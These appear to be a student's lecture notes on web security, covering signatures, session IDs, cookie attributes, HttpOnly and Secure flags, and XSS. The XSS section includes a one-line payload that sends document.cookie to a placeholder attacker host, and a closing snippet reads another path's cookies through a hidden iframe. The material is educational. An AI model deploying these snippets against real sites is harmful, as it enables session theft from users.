### Signing

- $G \to (pk,\ sk)$
- $S(sk,\ x) \to t$
- $V(pk,\ x,\ t) \to \text{Accept}$

use secret key $sk$ to sign, use public key $pk$ to verify.

### How to use `SessionId`

1. generate `SessionId` when the user login (and set it in cookie)
2. invalidate the generated `SessionId` when the user logouts (and clear it in cookie)

### History of cookies

- Implemented in 1994
- No spec for 17 years
- Ad-hoc design has led to *interesting* issues

### Cookie attributes
- `Expires` - specifies expration date. If no date, then last for session (here session means time when the user use the browser, if close the browser, it goes away)
- `Path` - Scope the "Cookie" **request header** to a particular **request path prefix**
  - e.g. At `web.stanford.edu/class/cs106a`, `document.cookie = 'sessionId=1234; Path=/class/cs106a'`; then at `web.stanford.edu/class/cs235`, `document.cookie` is empty string.
  - **Broken**! Do not use for security
- `Domain` - Allows the cookie to be scoped to a domain broder than the domain that returned the `Set-Cookie` header
  - e.g. `login.stanford.edu` could set a cookie for `stanford.edu`

### Sesskion hijacking mitigation

1. `Set-Cookie: key=value; Secure` - Use `Secure` cookie attribute to prevent cookie from being sent over unencrypted HTTP connections
2. Even better: Use HTTPS for entire website

### About XSS
1. The attacker inject malicious code to the website
   - e.g. `new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie`
2. The user visit the website
3. The user's cookie is sent to the attacker (session stealed)

### Protect cookies from XSS
Make cookie not accessable from javascript (Use `HttpOnly` cookie) 
```
Set-Cookie: key=value; Secure; HttpOnly  
```

### Bypass `Path`
At `web.standford.edu/class/cs253`,
```javascript
const iframe = document.createElement('iframe')
iframe.src = 'https://web.stanford.edu/class/cs106a/'
document.body.append(iframe)
iframe.style.display = 'none' // make it invisible 
iframe.contentDocument.cookie // read cookie set by https://web.stanford.edu/class/cs106a/
                              // stay tuned for same origin policy (the reason why we can do it)
```